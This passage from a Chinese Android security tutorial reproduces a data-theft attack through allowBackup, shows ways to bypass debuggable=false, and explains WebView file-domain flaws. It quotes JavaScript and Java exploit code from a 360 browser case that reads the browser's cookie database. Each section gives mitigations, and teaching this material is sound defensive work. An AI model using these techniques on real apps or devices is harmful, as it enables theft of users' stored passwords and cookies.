+<p>发现右上角可以添加账户密码信息，我们添加，密码设置<code>123456</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/20.png" alt="image-20211026195256415"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/21.png" alt="image-20211026195314419"></p>
+<p>这样我们就在apk中就存入了一些信息，接下来我们来看如何备份和恢复这些信息呢</p>
+<p><strong>数据备份：</strong></p>
+<p>我们先用jadx-gui打开目标程序，查看allowbackup&#x3D;true</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/22.png" alt="image-20211026195645086"></p>
+<p>这里发现是可以备份的，所以我们输入备份命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb backup -f allowBackup.ab -noapk com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/23.png" alt="image-20211026195847860"></p>
+<p>我们的手机就弹出备份请求，如果你要加密就输入加密密码，这里我们直接备份</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/24.png" alt="image-20211026195945086"></p>
+<p>备份完成后，我们在当前目录下就可以发现我们备份的文件<code>allowBackup.ab</code></p>
+<p><strong>数据解析：</strong></p>
+<p>我们需要使用<code>abe</code>工具对备份的文件解压，下载路径：<a target="_blank" rel="noopener" href="https://github.com/nelenkov/android-backup-extractor/releases"><code>abe工具</code></a></p>
+<p>我们下载后，需要安装jdk环境，然后使用命令解压：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar abe.jar unpack allowBackup.ab <span class="number">1.</span>tar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/25.png" alt="image-20211026200752183"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/26.png" alt="image-20211026200815420"></p>
+<p>解压</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/27.png" alt="image-20211026200904172"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/28.png" alt="image-20211026200925823"></p>
+<p>我们就得到了database.db数据库，然后我们使用DB Browser for SQLite打开，下载路径：<a target="_blank" rel="noopener" href="https://sqlitebrowser.org/">DB Browser</a></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/29.png" alt="image-20211026201414775"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/30.png" alt="image-20211026201601455"></p>
+<p>这样我们就成功解析出了备份的数据信息</p>
+<p><strong>数据恢复：</strong></p>
+<p>我们卸载目标程序，然后重新安装</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/32.png" alt="image-20211026204949157"></p>
+<p>我们输入恢复命令：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb restore allowBackup.ab </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/31.png" alt="image-20211026202027001"></p>
+<p>然后我们恢复数据，数据恢复完成</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/33.png" alt="image-20211026205126480"></p>
+<p>我们再次进入发现，直接进入之前界面，说明此时我们输入之前密码，就可以成功的进入</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/34.png" alt="image-20211026205258432"></p>
+<p>登录成功，并且出现我们之前的密码信息</p>
+<h5 id="lt-2-gt-漏洞说明"><a href="#lt-2-gt-漏洞说明" class="headerlink" title="&lt;2&gt; 漏洞说明"></a>&lt;2&gt; 漏洞说明</h5><p>上文我们拿一个样例，带大家完整的复现了一遍数据备份漏洞的过程，这个过程中如果我们发现一个目标程序的<code>allowBackup</code>为true，我们可以备份下其数据信息，在另外一个安装该目标程序的手机中进行恢复，这样我们就可以获得用户的敏感数据信息了，另外一个类似的案例可以参考网址：<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000002590577">阿里聚安全allowBackup安全解析</a></p>
+<h5 id="lt-3-gt-安全防护"><a href="#lt-3-gt-安全防护" class="headerlink" title="&lt;3&gt; 安全防护"></a>&lt;3&gt; 安全防护</h5><p>只需要将allowBackup设置为false即可</p>
+<h4 id="（2）debuggable-安全风险"><a href="#（2）debuggable-安全风险" class="headerlink" title="（2）debuggable 安全风险"></a>（2）debuggable 安全风险</h4><p>我们知道<code>debuggable=true</code>，用户才能进行动态调试，下面就是<code>debuggable=false</code>，使用AndroidStudio调试的情况</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/35.png" alt="image-20211026210557350"></p>
+<p>下面我们介绍几种方法绕过<code>debuggle=false</code></p>
+<h5 id="lt-1-gt-使用mprop"><a href="#lt-1-gt-使用mprop" class="headerlink" title="&lt;1&gt; 使用mprop"></a>&lt;1&gt; 使用mprop</h5><p>mprop下载地址：<a target="_blank" rel="noopener" href="https://github.com/wpvsyou/mprop">mprop</a></p>
+<p>原理解析：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过修改 ro.debuggable =1 来达到调试的目的，由于不是从系统内核层面修改，所以系统重启之后需要重新配置</span><br></pre></td></tr></table></figure>
+
+<p>配置过程：</p>
+<p>首先， 将mprop文件拷贝到.&#x2F;data&#x2F;local&#x2F;tmp文件下 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push mprop /data/local/tmp</span><br></pre></td></tr></table></figure>
+
+<p>然后运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mprop ro.debuggable 1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/36.png" alt="image-20211026210557350"></p>
+<p>查询是否修改成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.debuggable</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/37.png" alt="image-20211026210557350"></p>
+<p>我们修改值后，还需要重启一下，使得进程被更新，使用命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stop;start</span><br></pre></td></tr></table></figure>
+
+<p>此时我们就可以进行动态调试了</p>
+<h5 id="lt-2-gt-使用Xposed模块"><a href="#lt-2-gt-使用Xposed模块" class="headerlink" title="&lt;2&gt; 使用Xposed模块"></a>&lt;2&gt; 使用Xposed模块</h5><p>xposed模块中很多都可以通过hook来修改 <code>ro.debuggable</code>的值，这里我们使用<code>App Debuggable</code>模块，<a target="_blank" rel="noopener" href="https://repo.xposed.info/module/cn.forgiveher.appdebuggable">下载地址</a></p>
+<p>使用过程十分简单，我们的手机上安装Xposed框架之后，我们只需要将模块安装上去，激活即可，Xposed框架安装详细看之前帖子</p>
+<h5 id="lt-3-gt-系统定制"><a href="#lt-3-gt-系统定制" class="headerlink" title="&lt;3&gt; 系统定制"></a>&lt;3&gt; 系统定制</h5><p>我们也可以通过定制系统源码的方式来实现绕过，这里考虑到文章篇幅的原因，这里我收集了一个大佬的方法，相关教程我会放到github上，大家自行参考</p>
+<h4 id="（3）exported导出漏洞"><a href="#（3）exported导出漏洞" class="headerlink" title="（3）exported导出漏洞"></a>（3）exported导出漏洞</h4><p>由于exported导出漏洞基本是和Android四大组件相关，我们在前面的帖子中已经将这里讲的比较详细了，大家可以回看前面的帖子</p>
+<p><strong>安全防护：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）权限控制</span><br><span class="line">（2）设置export = false</span><br></pre></td></tr></table></figure>
+
+<p>具体参考上文和前面帖子</p>
+<h3 id="2-WebView安全配置漏洞"><a href="#2-WebView安全配置漏洞" class="headerlink" title="2. WebView安全配置漏洞"></a>2. WebView安全配置漏洞</h3><p>由于WebView涉及的漏洞较多，后面我会做一个专题归纳WebView的大部分漏洞的情况，这里只是简要列出一些配置相关的漏洞问题</p>
+<h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>webview控件将<code>setAllowFileAccessFromFileURLs</code>或<code>setAllowUniversalAcessFromFileURLsAPI</code>设置为<code>true</code>,开启了file域访问，且允许file域访问HTTP域，但是并未对file域的路径做严格限制</p>
+<p>检测方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webview控件是否将setAllowFileAccessFromFileURLs或setAllowUniversalAcessFromFileURLsAPI设置为<span class="literal">true</span></span><br><span class="line">客户端是否对file:<span class="comment">//路径进行严格限制</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）漏洞案例"><a href="#（2）漏洞案例" class="headerlink" title="（2）漏洞案例"></a>（2）漏洞案例</h4><h5 id="lt-1-gt-WebView密码明文存储漏洞——setSavePassword-true"><a href="#lt-1-gt-WebView密码明文存储漏洞——setSavePassword-true" class="headerlink" title="&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)"></a>&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)</h5><p>WebView默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时，会弹出提示框，询问用户是否保存密码，如果用户确定，密码会被保存在<code>/data/data/com.package.name/databases/webview.db</code>，然后我们可以在root权限下直接拿出密码相关信息，因此建议用户密码加密存储</p>
+<h5 id="lt-2-gt-WebView域控制不严格漏洞"><a href="#lt-2-gt-WebView域控制不严格漏洞" class="headerlink" title="&lt;2&gt; WebView域控制不严格漏洞"></a>&lt;2&gt; <strong>WebView域控制不严格漏洞</strong></h5><p><strong>setAllowFileAccess</strong></p>
+<p>WebView默认开启密码保存功能 mWebView.setAllowFileAccess(true) ，在File域下，能够执行任意的JavaScript代码，同源策略跨域访问能够对私有目录文件进行访问，APP对切入WebView未对file:&#x2F;&#x2F;&#x2F;形式的URL做限制，会导致隐私信息泄漏，针对聊天软件会导致信息泄漏，针对浏览器软件，会导致cookie信息泄漏</p>
+<p><strong>setAllowFileAccessFromFileURLs</strong></p>
+<p>在JELLY_BEAN以前的版本默认是setAllowFileAccessFromFileURLs(true),允许通过file域url中的Javascript读取其他本地文件，在JELLY_BEAN及以后的版本中默认已被是禁止。</p>
+<p><strong>setAllowUniversalAccessFromFileURLs</strong></p>
+<p>在JELLY_BEAN以前的版本默认是setAllowUniversalAccessFromFileURLs(true),允许通过file域url中的Javascript访问其他的源，包括其他的本地文件和http,https源的数据。在JELLY_BEAN及以后的版本中默认已被禁止。</p>
+<p><strong>案例：360手机浏览器缺陷可导致用户敏感数据泄漏</strong></p>
+<p>以360手机浏览器4.8版本为例，由于未对file域做安全限制，恶意APP调用360浏览器加载本地的攻击页面（比如恶意APP释放到SDCARD上的一个HTML）后，就可以获取360手机浏览器下的所有私有数据，包括webviewCookiesChromium.db下的cookie内容</p>
+<p>攻击页面关键代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">getDatabase</span><span class="params">()</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">request</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line"></span><br><span class="line">     request = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(request.overrideMimeType) &#123;</span><br><span class="line"></span><br><span class="line">           request.overrideMimeType(<span class="string">&#x27;text/xml&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xmlhttp = request;</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="string">&quot;file:////data/data/com.qihoo.browser/databases&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">postfix</span> <span class="operator">=</span> <span class="string">&quot;/webviewCookiesChromium.db&quot;</span>; <span class="comment">//取保存cookie的db</span></span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">path</span> <span class="operator">=</span> prefix.concat(postfix);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取本地文件代码</span></span><br><span class="line"></span><br><span class="line">    xmlhttp.open(<span class="string">&quot;GET&quot;</span>, path, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    xmlhttp.send(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">var</span> <span class="variable">ret</span> <span class="operator">=</span> xmlhttp.responseText;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">copyFile(); <span class="comment">//自定义函数，释放filehehe.html到sd卡上</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;file:///mnt/sdcard/filehehe.html&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">contIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"></span><br><span class="line">contIntent.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line"></span><br><span class="line">contIntent.setData(Uri.parse(url));</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"></span><br><span class="line">intent.setClassName(<span class="string">&quot;com.qihoo.browser&quot;</span>,<span class="string">&quot;com.qihoo.browser.BrowserActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">intent.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line"></span><br><span class="line">intent.setData(Uri.parse(url));</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.startActivity(intent);</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>通过以下设置，防止越权访问，跨域等安全问题</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）将不必要导出的组件设置为不导出</span><br><span class="line">（<span class="number">2</span>）如果应用的需要导出包含 Webview的组件，禁止使用File域协议 </span><br><span class="line"> setAllowFileAccess(<span class="literal">false</span>)</span><br><span class="line"> setAllowFileAccessFromFileURLs(<span class="literal">false</span>)</span><br><span class="line"> setAllowUniversalAccessFromFileURLs(<span class="literal">false</span>)</span><br><span class="line"> （<span class="number">3</span>）手机厂商把手机内置的WebView与google保持更新一致</span><br><span class="line"> （<span class="number">4</span>）用户随时把手机的内置 webview以及使用的浏览器更新到最新版本</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、实验总结"><a href="#六、实验总结" class="headerlink" title="六、实验总结"></a>六、实验总结</h2><p>本文总结归纳了Android中的权限安全漏洞和安全配置漏洞的详细信息，并拿一些案例进行了复现讲解，本文中只是对大部分这些漏洞的一个归纳总结，里面存在的一些问题就请各位指正了，本文所用到的实验样例和相关附件，后面都会上传github，详细大家参考：<a target="_blank" rel="noopener" href="https://github.com/guoxuaa/Android-Vulnerability-Mining/tree/main/1.Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">github地址</a></p>
+<h2 id="七、参考文献"><a href="#七、参考文献" class="headerlink" title="七、参考文献"></a>七、参考文献</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一行代码</span><br><span class="line">卢璐. Android应用权限泄露漏洞检测技术研究[D].西安电子科技大学,<span class="number">2018.</span></span><br><span class="line">姜维 Android应用安全防护和逆向分析</span><br><span class="line">https:<span class="comment">//juejin.cn/post/6844903997669638151#heading-13</span></span><br><span class="line">https:<span class="comment">//juejin.cn/post/6844903817662693384</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_38350635/article/details/103863992</span></span><br><span class="line">https:<span class="comment">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/yaq-qq/p/5843127.html</span></span><br><span class="line">ttps:<span class="comment">//www.codeleading.com/article/67095305050/</span></span><br><span class="line">https:<span class="comment">//github.com/nelenkov/android-backup-extractor/</span></span><br><span class="line">https:<span class="comment">//blog.csdn.net/qq_43290288/article/details/98873651</span></span><br><span class="line">https:<span class="comment">//segmentfault.com/a/1190000002590577</span></span><br><span class="line">https:<span class="comment">//ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安全后厨团队 |  微信公众号【安全后厨】
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://security-kitchen.com/2023/02/13/bug0013/" title="Android App漏洞之战（13）——权限安全和安全配置漏洞详解">http://security-kitchen.com/2023/02/13/bug0013/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag"># 漏洞挖掘</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/02/13/bug0012/" rel="prev" title="Android App漏洞之战（12）——Content Provider漏洞详解">
+      <i class="fa fa-chevron-left"></i> Android App漏洞之战（12）——Content Provider漏洞详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/13/bug0014/" rel="next" title="Android App漏洞之战（14）——信息泄露漏洞详解">
+      Android App漏洞之战（14）——信息泄露漏洞详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Android%E6%9D%83%E9%99%90%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D"><span class="nav-text">二、Android权限机制介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Android%E6%9D%83%E9%99%90"><span class="nav-text">1. Android权限</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89Android%E6%9D%83%E9%99%90%E5%8E%9F%E7%90%86"><span class="nav-text">（1）Android权限原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89Android%E6%9D%83%E9%99%90%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-text">（2）Android权限的分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E6%9D%83%E9%99%90%E7%BB%84"><span class="nav-text">（3）权限组</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E5%A6%82%E4%BD%95%E8%AF%B7%E6%B1%82%E6%9D%83%E9%99%90"><span class="nav-text">（4）如何请求权限</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E5%90%91%E6%B8%85%E5%8D%95%E6%96%87%E4%BB%B6%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%9D%83%E9%99%90"><span class="nav-text">&lt;1&gt;向清单文件中添加权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E8%BF%90%E8%A1%8C%E6%97%B6%E7%94%B3%E8%AF%B7%E6%9D%83%E9%99%90"><span class="nav-text">&lt;2&gt;运行时申请权限</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9D%83%E9%99%90"><span class="nav-text">（5）自定义权限</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E5%A6%82%E4%BD%95%E5%AE%9A%E4%B9%89%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9D%83%E9%99%90"><span class="nav-text">&lt;1&gt; 如何定义自定义权限</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9D%83%E9%99%90%E4%BD%BF%E7%94%A8"><span class="nav-text">&lt;2&gt;自定义权限使用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-3-gt-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9D%83%E9%99%90%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="nav-text">&lt;3&gt;自定义权限注意点</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%9D%83%E9%99%90%E5%AE%89%E5%85%A8%E7%A7%8D%E7%B1%BB%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="nav-text">2.权限安全种类和危害</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%9D%83%E9%99%90%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">三、权限安全漏洞原理分析和复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">1.漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="nav-text">2.漏洞案例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E"><span class="nav-text">（1）下载文件权限泄漏漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E7%8C%8E%E8%B1%B9%E6%B8%85%E7%90%86%E5%A4%A7%E5%B8%88%E5%86%85%E5%AD%98%E6%B8%85%E7%90%86%E6%9D%83%E9%99%90%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E"><span class="nav-text">（2）猎豹清理大师内存清理权限泄漏漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E9%98%B2%E6%8A%A4"><span class="nav-text">3.漏洞防护</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E7%BB%84%E4%BB%B6%E8%AE%BE%E7%BD%AE%E4%B8%8D%E5%8F%AF%E5%AF%BC%E5%87%BA"><span class="nav-text">（1）组件设置不可导出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E8%AE%BE%E7%BD%AE%E6%9D%83%E9%99%90%E7%BA%A7%E5%88%AB"><span class="nav-text">（2）设置权限级别</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Android%E9%BB%98%E8%AE%A4%E8%AE%BE%E7%BD%AE%E4%BB%8B%E7%BB%8D"><span class="nav-text">四、Android默认设置介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89AndroidManifest-xml%E9%BB%98%E8%AE%A4%E8%AE%BE%E7%BD%AE"><span class="nav-text">（1）AndroidManifest.xml默认设置</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-allowBackup"><span class="nav-text">&lt;1&gt; allowBackup</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-debuggable"><span class="nav-text">&lt;2&gt; debuggable</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-3-gt-exported"><span class="nav-text">&lt;3&gt; exported</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89WebView%E9%BB%98%E8%AE%A4%E8%AE%BE%E7%BD%AE"><span class="nav-text">（2）WebView默认设置</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Android%E9%BB%98%E8%AE%A4%E8%AE%BE%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="nav-text">五、Android默认设置漏洞原理分析和复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-allowBackup"><span class="nav-text">1. allowBackup</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%A4%87%E4%BB%BD%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E"><span 